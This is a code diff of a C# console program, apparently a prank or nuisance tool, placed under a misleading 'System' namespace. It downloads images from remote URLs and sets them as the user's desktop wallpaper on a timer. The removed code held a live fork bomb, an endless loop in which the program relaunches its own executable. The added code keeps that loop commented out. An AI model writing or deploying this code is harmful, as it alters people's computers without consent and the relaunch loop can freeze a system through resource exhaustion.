@@ -11,6 +11,7 @@ using Microsoft.Win32;
 using System.Drawing;
 using System.Net;
 using System.Security.Cryptography.X509Certificates;
+using System.Threading;
 
 namespace System
 {
@@ -19,6 +20,8 @@ namespace System
         const int SPI_SETDESKWALLPAPER = 20;
         const int SPIF_UPDATEINIFILE = 0x01;
         const int SPIF_SENDWININICHANGE = 0x02;
+        private static int invokeCount = 0;
+
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
@@ -33,29 +36,32 @@ namespace System
 
         static void Main(string[] args)
         {
-               
+            // Create an AutoResetEvent to signal the timeout threshold in the
+            // timer callback has been reached.
+            var autoEvent = new AutoResetEvent(false);
 
-            if (DateTime.Now.Hour > 12 && DateTime.Now.Hour < 13)
-            {
-                Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Style.Fill);
-            }
+            var statusChecker = new StatusChecker(3);
 
+            // Create a timer that invokes CheckStatus after 5 seconds, 
+            // and every 10 seconds thereafter.
+            Console.WriteLine("{0:h:mm:ss.fff} Creating timer.\n",
+                DateTime.Now);
 
-            if (DateTime.Now.Hour > 13 && DateTime.Now.Hour < 14)
-            {
-                Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Style.Fill);
-            }
+            var stateTimer = new Timer(statusChecker.CheckStatus,
+                autoEvent, 5000, 10000);
 
-            if (DateTime.Now.Hour > 14 && DateTime.Now.Hour < 15)
-            {
-                while (true)
-                {
-                    Process.Start(Assembly.GetExecutingAssembly().Location);
-                }
-            }
+            // When autoEvent signals, change the period to every 10 seconds.
+            autoEvent.WaitOne();
+            stateTimer.Change(0, 10000);
+            Console.WriteLine("\nChanging period to 10 seconds.\n");
+
+            // When autoEvent signals the second time, dispose of the timer.
+            autoEvent.WaitOne();
+            stateTimer.Dispose();
+            Console.WriteLine("\nDestroying timer.");
 
         }
-
+        
         public static void Set(Uri uri, Style style)
         {
             Stream s = new WebClient().OpenRead(uri.ToString());
@@ -94,4 +100,49 @@ namespace System
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
     }
+
+    class StatusChecker
+    {
+        private int invokeCount;
+        private int maxCount;
+
+        public StatusChecker(int count)
+        {
+            invokeCount = 0;
+            maxCount = count;
+        }
+
+        // This method is called by the timer delegate.
+        public void CheckStatus(Object stateInfo)
+        {
+            AutoResetEvent autoEvent = (AutoResetEvent)stateInfo;
+            Console.WriteLine("{0} Checking status {1,2}.",
+                DateTime.Now.ToString("h:mm:ss.fff"),
+                (++invokeCount).ToString());
+
+            if (invokeCount == 1)
+            {
+                Program.Set(new Uri("https://i.ytimg.com/vi/Uv5shWPfqvA/maxresdefault.jpg"), Program.Style.Fill);
+            }
+            if (invokeCount == 2)
+            {
+                Program.Set(new Uri("https://www.dailydot.com/wp-content/uploads/7dd/f2/f4ff8b0d242f954810eb3b609c747f31.jpg"), Program.Style.Fill);
+            }
+            //if (invokeCount == 3)
+            //{
+            //    while (true)
+            //    {
+            //        Process.Start(Assembly.GetExecutingAssembly().Location);
+            //    }
+            //}
+
+            if (invokeCount == maxCount)
+            {
+                // Reset the counter and signal the waiting thread.
+                invokeCount = 0;
+                autoEvent.Set();
+            }
+        }
+    }
+
 }
